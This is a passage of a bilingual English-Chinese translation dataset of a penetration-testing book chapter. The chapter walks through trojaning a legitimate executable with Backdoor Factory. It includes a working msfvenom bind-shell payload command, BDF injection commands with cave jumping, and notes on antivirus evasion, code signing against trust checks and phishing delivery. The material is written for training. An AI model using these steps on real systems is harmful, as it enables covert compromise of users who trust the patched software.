  zh: '**--cave** 和 **--shell_length=** 用于在二进制文件中寻找代码洞。虽然 **--cave** 可以找到所有代码洞并列出它们，**--shell_length=**
    用于定义特定大小的代码洞。'
- en: '**--output-file=** is where our finished product will go.'
  id: totrans-171
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--output-file=** 是我们最终生成的文件保存的路径。'
- en: '**--section=** is used when we’re naming our new section created with **--add_new_section**.'
  id: totrans-172
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--section=** 用于命名我们通过 **--add_new_section** 创建的新节。'
- en: '**--directory=** is a delightful option that makes BDF especially powerful;
    this allows us to backdoor an entire *directory* of binaries. Keep in mind that
    the default behavior is hunting for code caves, which means each individual executable
    needs to be processed. By combining this option with **--add_new_section**, BDF
    won’t need to hunt for caves and this process is a lot faster. Remember the rule
    of thumb that adding sections is not stealthy.'
  id: totrans-173
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--directory=** 是一个非常实用的选项，使 BDF 变得特别强大；它允许我们对整个*目录*的二进制文件进行后门处理。请记住，默认行为是寻找代码洞，这意味着每个独立的可执行文件都需要进行处理。将此选项与
    **--add_new_section** 结合使用时，BDF 不再需要寻找代码洞，这个过程会更快。记住一个经验法则，添加新节并不隐蔽。'
- en: '**--change_access** is default behavior; you will only change this in certain
    situations. This option makes the code cave where our payload lies writable and
    executable.'
  id: totrans-174
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--change_access** 是默认行为；只有在某些情况下你才需要更改它。此选项使得载荷所在的代码洞变为可写和可执行。'
- en: '**--injector**, **--suffix=**, and **--delete_original** are part of the injector
    module and are Windows-only, so we won’t play with them here. I didn’t skip them
    because they’re interesting and dangerous. They’re very aggressive and potentially
    destructive, so I advise caution. They will hunt the system for patchable executables,
    inject them, and save the original file according to the **suffix** parameter.
    With **--delete_original**, the original untouched executable goes away, leaving
    behind the injected copy. The **--injector** module will even check to see whether
    the target is running and, if so, shut it down, inject it, and then attempt to
    restart it.'
  id: totrans-175
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--injector**、**--suffix=** 和 **--delete_original** 是注入器模块的一部分，仅适用于 Windows
    系统，因此在这里我们不进行操作。我没有跳过它们，因为它们既有趣又危险。它们非常激进且具有潜在的破坏性，因此建议小心使用。它们会在系统中寻找可修补的可执行文件，进行注入，并根据
    **suffix** 参数保存原始文件。如果使用 **--delete_original**，原始的未触及的可执行文件将被删除，留下注入后的副本。**--injector**
    模块甚至会检查目标是否正在运行，如果是，它将关闭目标程序，进行注入，然后尝试重新启动它。'
- en: '**--support_check** allows BDF to determine whether the target can be injected
    without attempting to do so. This check is done when you try to inject a file
    anyway, so this can be useful for research.'
  id: totrans-176
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--support_check** 允许 BDF 判断目标是否可以在不进行注入的情况下被注入。当你尝试注入一个文件时，会进行此检查，因此这对研究很有帮助。'
- en: '**--cave-miner** is for adapting our shellcode generation to fit the target
    executable rather than the other way around. It helps us to find the smallest
    possible payload that can fit into one of the available caves.'
  id: totrans-177
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--cave-miner** 用于调整我们的 shellcode 生成，使其适应目标可执行文件，而不是相反。它帮助我们找到可以适配到某个代码洞中的最小有效载荷。'
- en: '**--verbose** is for debugging the injection process.'
  id: totrans-178
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--verbose** 用于调试注入过程。'
- en: '**--image-type=** lets you identify the binaries to be patched as x86 or x64
    (or both). The default is both.'
  id: totrans-179
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--image-type=** 让你能够识别要修补的二进制文件是 x86 还是 x64（或两者都有）。默认是两者都有。'
- en: '**--beacon=** is for payloads that can send out beacons or heartbeats. This
    option takes an interval in seconds as the argument.'
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--beacon=** 用于能够发送信标或心跳的有效载荷。此选项接受以秒为单位的间隔时间作为参数。'
- en: '**--xp_mode** enables your creation to run on Windows XP. That’s right – by
    default, a BDF Trojan will crash on XP. This is a sandbox countermeasure – as
    XP is becoming less and less popular as an actual home (or production) operating
    system, it’s still finding use in VMs and other environments as a place where
    you can detonate digital explosives without fear of damaging something valuable.
    Of course, modern sandboxing takes place in any operating system you please, so
    this option won’t make an enormous difference. Be aware of it if you’re explicitly
    targeting XP – plenty of production environments still use XP for application
    compatibility reasons.'
  id: totrans-181
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--xp_mode** 使你的创作能够在Windows XP上运行。没错——默认情况下，BDF木马会在XP上崩溃。这是一种沙箱对策——随着XP逐渐不再作为实际的家庭（或生产）操作系统使用，它仍然在虚拟机和其他环境中找到了用途，可以在不担心破坏宝贵数据的情况下引爆数字炸弹。当然，现代沙箱可以在任何操作系统上进行，所以这个选项不会产生巨大的区别。如果你明确针对XP进行攻击，请留意这一点——许多生产环境仍然使用XP，以便兼容某些应用程序。'
- en: '**--code_sign** is very useful in the case of secure environments that only
    trust signed code. This allows you to sign your creation with your own signing
    certificate and private key. Naturally, you won’t possess legitimate ones for
    some major software maker (right?), but if the check is for the simple fact that
    the code is signed with *any* certificate, then this option is very handy. If
    you aren’t signing your file, then you need to pass **--zero_cert**.'
  id: totrans-182
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--code_sign** 在安全环境中非常有用，尤其是那些只信任签名代码的环境。这使得你可以用自己的签名证书和私钥签署你的作品。当然，你不可能拥有一些大型软件制造商的合法签名证书（对吧？），但如果检查只是在乎代码是否用*任何*证书签署，那么这个选项非常方便。如果你没有签署你的文件，那么你需要使用**--zero_cert**。'
- en: This tool gives us quite a bit of control over the injection process. With this
    kind of low-level control, we can understand our projects more intimately and
    fine-tune our Trojans according to our needs. Let’s go ahead and pick an executable
    that will become our infected program and do some low-level analysis.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 这个工具使我们在注入过程中拥有相当多的控制权。通过这种低级别的控制，我们可以更深入地了解我们的项目，并根据需要精细调整我们的木马。接下来，我们将选择一个可执行文件，作为我们的感染程序，进行一些低级分析。
- en: Trojan engineering with BDF and IDA
  id: totrans-184
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用BDF和IDA进行木马工程
- en: The best target binaries are lightweight and portable – that is, they have few
    or no dependencies. A program that requires a full installation isn’t ideal. We’re
    going to suppose that an employee at our client uses a lightweight piece of freeware
    for data recovery. During our reconnaissance phase, we established a trust relationship
    between this employee and another person at the company. We also discovered an
    open SMTP relay, so we’ll be trying a social engineering attack, suggesting that
    the employee download the newer version. We’ll send a link that would actually
    point at our Kali box to pull the Trojaned file.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 最理想的目标二进制文件是轻量级和可移植的——也就是说，它们依赖较少或根本没有依赖。一个需要完整安装的程序并不理想。我们假设客户的员工使用一个轻量级的免费软件来进行数据恢复。在我们的侦察阶段，我们建立了这个员工与公司另一位员工之间的信任关系。我们还发现了一个开放的SMTP中继，因此我们将尝试进行社会工程攻击，建议员工下载新版软件。我们会发送一个链接，实际上指向我们的Kali主机，拉取被植入木马的文件。
- en: 'Before we get started, we will confirm the current status of our target executable
    from an AV community trust perspective and validate that it is trusted across
    the board. The program we’re using, **DataRecovery.exe**, is known by the community
    to be trustworthy. This helps us when trying to gauge the level of evasion we
    are accomplishing. Grab some coffee and let’s proceed. First, we’ll create our
    own payload with **msfvenom**:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始之前，我们将确认目标可执行文件的当前状态，从AV社区的信任角度进行验证，确保它被普遍信任。我们正在使用的程序**DataRecovery.exe**，在社区中被认为是可信的。这有助于我们评估我们所实现的规避程度。去拿杯咖啡吧，我们继续。首先，我们将使用**msfvenom**创建我们自己的有效载荷：
- en: msfvenom --arch x86 --platform windows --payload windows/shell/bind_tcp EXITFUNC=thread
    LPORT=1066 --encoder x86/shikata_ga_nai --iterations 5 > trojan.bin
  id: totrans-187
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --arch x86 --platform windows --payload windows/shell/bind_tcp EXITFUNC=thread
    LPORT=1066 --encoder x86/shikata_ga_nai --iterations 5 > trojan.bin
- en: '![Figure 12.11 – Generating an encoded payload with msfvenom ](image/Figure_12.11_B17616.jpg)'
  id: totrans-188
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.11 – 使用msfvenom生成编码后的有效载荷](image/Figure_12.11_B17616.jpg)'
- en: Figure 12.11 – Generating an encoded payload with msfvenom
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.11 – 使用msfvenom生成编码后的有效载荷
- en: 'Do you remember those days of plenty when we could use the Meterpreter reverse
    connection payload? That was back when we were wealthy, where 179 kilobytes made
    us snootily laugh. Those days are gone when we’re dealing with potentially tiny
    code caves. I’ve used **windows/shell/bind_tcp** in this case, as it’s far smaller.
    This affords us room to do multiple iterations of **x86/shikata_ga_nai**. Even
    with five iterations, we end up with a paltry 482 bytes. The attack will thus
    require us to connect to the target instead of waiting for the connection back.
    For my later analysis of the final product, I’ll examine the payload with **xxd**
    right now so that I can grab some of the raw bytes:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 你还记得那些丰盛的日子吗？那时我们可以使用Meterpreter反向连接payload。那时候我们富裕，179千字节的文件都能让我们傲慢地笑一笑。如今，当我们处理可能微小的代码cave时，那些日子已经一去不复返了。在这种情况下，我使用了**windows/shell/bind_tcp**，因为它要小得多。这为我们提供了进行多次**x86/shikata_ga_nai**迭代的空间。即使进行了五次迭代，我们最终也只得到了可怜的482字节。因此，这个攻击将要求我们主动连接目标，而不是等待对方的反向连接。为了之后分析最终产品，我现在就用**xxd**检查payload，获取一些原始字节：
- en: '![Figure 12.12 – Grabbing raw bytes from our payload with xxd ](image/Figure_12.12_B17616.jpg)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.12 – 使用xxd抓取payload的原始字节](image/Figure_12.12_B17616.jpg)'
- en: Figure 12.12 – Grabbing raw bytes from our payload with xxd
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.12 – 使用xxd抓取payload的原始字节
- en: 'Next, we’ll fire up BDF and pass our encoded binary as user-supplied shellcode:'
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将启动BDF，并将我们编码后的二进制文件作为用户提供的shellcode传入：
- en: ./backdoor.py --file=DataRecovery.exe --shell=user_supplied_shellcode_threaded
    --user_shellcode=trojan.bin --output-file=datarec.exe --zero_cert
  id: totrans-194
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./backdoor.py --file=DataRecovery.exe --shell=user_supplied_shellcode_threaded
    --user_shellcode=trojan.bin --output-file=datarec.exe --zero_cert
- en: 'This is where we have some control over the process. Take a look at this prompt,
    where the appropriate code caves have been identified:'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 这是我们可以控制的部分。看一下这个提示，已标出合适的代码cave：
- en: '![Figure 12.13 – Examining code caves for our jumps ](image/Figure_12.13_B17616.jpg)'
  id: totrans-196
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.13 – 检查代码cave以便跳转](image/Figure_12.13_B17616.jpg)'
- en: Figure 12.13 – Examining code caves for our jumps
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.13 – 检查代码cave以便跳转
- en: 'Let’s take a dive into the machine code for this program and examine these
    memory locations. What we’re really after is a suitable code cave to place a payload.
    Why not explore the raw bytes that make up this program as it appears on disk?
    Using **xxd** as we did earlier in the chapter, I’ll pick on code cave number
    two – 2,941 bytes in length, it begins at **0x4a47f** and ends at **0x4affc**:'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们深入研究这个程序的机器代码，检查这些内存位置。我们真正要寻找的是一个合适的代码cave来放置payload。为什么不直接探索程序在磁盘上的原始字节呢？像之前在章节中使用**xxd**那样，我选择了第二个代码cave——长度为2,941字节，从**0x4a47f**开始，到**0x4affc**结束：
- en: '![Figure 12.14 – Examining the code cave ](image/Figure_12.14_B17616.jpg)'
  id: totrans-199
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.14 – 检查代码cave](image/Figure_12.14_B17616.jpg)'
- en: Figure 12.14 – Examining the code cave
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.14 – 检查代码cave
- en: 'This looks like a cozy spot for our shellcode. We continue by passing **2**
    to BDF, and it spits out our Trojaned executable. I bet you’re feeling like a
    truly elite world-class hacker at this point. Not so fast, grasshopper – get your
    evil creation scanned and see how we did on evasion. We ended up with a detection
    rate of exactly *50%*. Oh, my. One in two scanners picked this up. What happened
    here? For one, we didn’t employ cave jumping, so our payload was dumped into one
    spot. We’re going to try cave jumping and then experiment with different sections
    of the executable:'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 这里看起来是我们shellcode的一个理想位置。我们继续将**2**传递给BDF，它会输出我们的木马可执行文件。我敢打赌，你此刻一定觉得自己像个真正的世界级黑客。别急，草蜢——先让你的邪恶创作通过扫描，看我们在规避方面做得如何。最后我们得到了**50%**的检测率。哦，我的天。每两个扫描器就有一个能检测到它。发生了什么？首先，我们没有使用“cave
    jumping”（代码跳跃），所以我们的payload被直接放到了一个位置。接下来，我们将尝试“cave jumping”，并实验可执行文件的不同部分：
- en: ./backdoor.py --file=DataRecovery.exe --shell=user_supplied_shellcode_threaded
    --cave_jumping --user_shellcode=trojan.bin --output-file=datarec3.exe --zero_cert
  id: totrans-202
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./backdoor.py --file=DataRecovery.exe --shell=user_supplied_shellcode_threaded
    --cave_jumping --user_shellcode=trojan.bin --output-file=datarec3.exe --zero_cert
- en: 'More advanced analysis of the flow of execution in our chosen program will
    help us identify the appropriate injection points. For those of us in the field,
    where time is of the essence, I encourage you to set up a lab that replicates
    the target’s antimalware defenses as accurately as possible. Reconnaissance can
    often yield us information about corporate AV solutions (hint: conduct open source
    recon on technical support forums), and we can create payloads via trial and error.'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 对我们所选程序的执行流程进行更深入的分析，有助于我们识别合适的注入点。对于我们这些时间至关重要的从业者，我建议你搭建一个尽可能准确复制目标反恶意软件防御的实验室环境。侦察通常能为我们提供有关企业
    AV 解决方案的信息（提示：在技术支持论坛上进行开源侦察），我们可以通过反复试验创建有效的有效载荷。
- en: 'As we’re cave jumping, we have control over which null byte blocks get our
    chunk of shellcode:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们跳跃洞穴时，我们可以控制哪些空字节块包含我们的 shellcode。
- en: '![Figure 12.15 – Selecting caves in BDF ](image/Figure_12.15_B17616.jpg)'
  id: totrans-205
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.15 – 在 BDF 中选择洞穴](image/Figure_12.15_B17616.jpg)'
- en: Figure 12.15 – Selecting caves in BDF
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.15 – 在 BDF 中选择洞穴
- en: 'When I selected my caves more carefully, trying to scatter the execution a
    bit, I was eventually able to create a file with a detection rate of only *10.6%*.
    When we’re happy with the payload, we deliver it via our chosen vector (in our
    scenario, as a local URL sent via a forged email) and wait for the victim to execute
    the Trojan. Here, we see the backdoored DataRecovery tool working normally, but
    in the background, port **1066** is open and waiting for our connection:'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 当我更加仔细地选择我的洞穴，尝试分散执行时，我最终能够创建一个检测率仅为*10.6%*的文件。当我们对有效载荷感到满意时，我们通过选定的向量进行投递（在我们的场景中，通过伪造的电子邮件发送本地
    URL）并等待受害者执行木马。在这里，我们看到被后门化的 DataRecovery 工具正常工作，但在后台，端口**1066**已打开并等待我们的连接：
- en: '![Figure 12.16 – A target executable running with the bound port ](image/Figure_12.16_B17616.jpg)'
  id: totrans-208
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.16 – 绑定端口的目标可执行文件正在运行](image/Figure_12.16_B17616.jpg)'
- en: Figure 12.16 – A target executable running with the bound port
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.16 – 绑定端口的目标可执行文件正在运行
- en: 'As part of your study to get a better handle on what’s happening behind the
    scenes, don’t forget to dump your Trojan’s bytes in your favorite tool and look
    for your shellcode. Look for your shellcode bytes (as we recovered them in **xxd**,
    previously):'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 作为你学习的一部分，为了更好地理解幕后发生的事情，不要忘记在你喜欢的工具中转储木马的字节，并寻找你的 shellcode。查找你的 shellcode
    字节（正如我们之前在**xxd**中恢复的那样）：
- en: '![Figure 12.17 – Grepping out some of the bytes we collected earlier ](image/Figure_12.17_B17616.jpg)'
  id: totrans-211
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.17 – grep 出我们之前收集的一些字节](image/Figure_12.17_B17616.jpg)'
- en: Figure 12.17 – Grepping out some of the bytes we collected earlier
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.17 – grep 出我们之前收集的一些字节
- en: Of course, this is just an extra credit exercise. The idea is to learn more
    about how the injection works. It’s quite the rabbit hole, so have fun exploring
    your creations.
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 当然，这只是一个额外的练习。其目的是深入了解注入是如何工作的。这确实是一个让人迷失的兔子洞，所以请享受探索你自己创作的过程。
- en: Though this wraps up our lab exercise, keep the core concept in mind – you may
    need to conduct significant trial and error before you find something that works
    in your target environment.
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管这结束了我们的实验练习，但请记住核心概念——在你找到适合目标环境的有效方法之前，可能需要进行大量的反复试验。
- en: Summary
  id: totrans-215
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we explored how malicious scripts interact with a host via
    the interpreter process, creating a unique defense scenario. We looked at a couple
    of straightforward templates for shellcode injection and data compromise and considered
    different ways to modify them to confuse scanners.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们探讨了恶意脚本如何通过解释器进程与主机交互，从而创建一个独特的防御场景。我们看了一些简单的模板，用于 shellcode 注入和数据泄露，并考虑了不同的方法来修改它们，以迷惑扫描器。
- en: After this lab, we took a brief dive into the theory of Metasploit’s shellcode
    generation and understood the function and role of encoders. We explored Windows
    executable payloads with a quick and easy disassembler within Kali and grepped
    for byte sequences to learn how to identify patterns in encoded shellcode. Finally,
    we explored patching legitimate executables to make them effective Trojans using
    our own payload. A part of this process was a review of the injection points with
    a hex dump. We explored the still-relevant BDF to identify code caves and the
    controlled use of them to hold our shellcode.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 在本实验之后，我们简要探讨了 Metasploit 的 Shellcode 生成理论，并理解了编码器的功能和作用。我们通过 Kali 中一个快速简便的反汇编工具探索了
    Windows 可执行载荷，并使用 `grep` 命令查找字节序列，学习如何识别编码 Shellcode 中的模式。最后，我们探索了如何修补合法的可执行文件，使其通过我们自己的载荷变成有效的特洛伊木马。这个过程中包括了通过十六进制转储来回顾注入点。我们还探索了仍然有效的
    BDF，识别代码洞并控制地使用它们来存放我们的 Shellcode。
- en: In the next chapter, we’ll take a look at the lower layers of abstraction from
    the perspective of the kernel. We’ll look at tried-and-true attacks to gain a
    core understanding of the underpinnings of kernel vulnerabilities and take a look
    at practical methods using the Metasploit Framework.
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将从内核的角度深入探讨更低层次的抽象。我们将了解一些经过验证的攻击方法，以深入理解内核漏洞的基础，并探讨使用 Metasploit 框架的实际方法。
- en: Questions
  id: totrans-219
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: What’s the difference between **VirtualAlloc()** and **VirtualAllocEx()**?
  id: totrans-220
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**VirtualAlloc()** 和 **VirtualAllocEx()** 有什么区别？'
- en: '**MiniDumpWriteDump()** can only be used to attack LSASS. (True | False)'
  id: totrans-221
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**MiniDumpWriteDump()** 只能用于攻击 LSASS。（对 | 错）'
- en: Code caves are sections in backdoor target executables composed of the **0x90**
    no-operation codes where we can stash our shellcode. (True | False)
  id: totrans-222
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 代码洞是后门目标可执行文件中的一部分，由**0x90**空操作码组成，我们可以将我们的 Shellcode 存放在其中。（对 | 错）
- en: When would we need **--xp_mode** when patching a target executable with BDF?
  id: totrans-223
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在使用 BDF 修补目标可执行文件时，我们何时需要**--xp_mode**？
